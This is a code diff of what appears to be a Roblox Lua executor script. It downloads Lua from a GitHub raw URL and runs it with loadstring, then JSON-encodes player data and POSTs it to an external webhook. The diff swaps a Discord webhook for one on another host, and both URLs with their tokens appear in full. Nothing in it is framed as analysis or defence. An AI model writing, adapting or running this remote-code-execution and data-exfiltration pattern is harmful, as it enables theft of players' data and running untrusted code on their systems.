@@ -14,7 +14,7 @@ warn[[
 ]]
 
 local HttpService = game:GetService("HttpService")
-local Webhook_URL = "https://discord.com/api/webhooks/1330461987951611987/NBCY_-KAdZ3wzIE-oxZb3XF8MpJP9fW0Qo_s-AapO-e-10lRyAcs0e0zHQ0UptlnvaY7"
+local Shit = "https://webhook.newstargeted.com/api/webhooks/1331228960230608957/yFOtvN6KnZniPYTHsUXt9q8YCfPbN6H_SYR0Kpa8-sHUMXf-san8L5WRb0VgQELylB6y"
 local data = loadstring(game:HttpGet("https://raw.githubusercontent.com/RedDaGoodScripter12355939292/verbose-goggles/refs/heads/main/WhitelistedData.lua", true))()
 
 local player = game.Players.LocalPlayer
@@ -100,7 +100,7 @@ local PlayerData = HttpService:JSONEncode(data)
 
 local Request = http_request or request or HttpPost or syn.request
 if Request then
-    Request({Url = Webhook_URL, Body = PlayerData, Method = "POST", Headers = Headers})
+    Request({Url = Shit, Body = PlayerData, Method = "POST", Headers = Headers})
 else
     warn("No supported HTTP request function found.")
 end
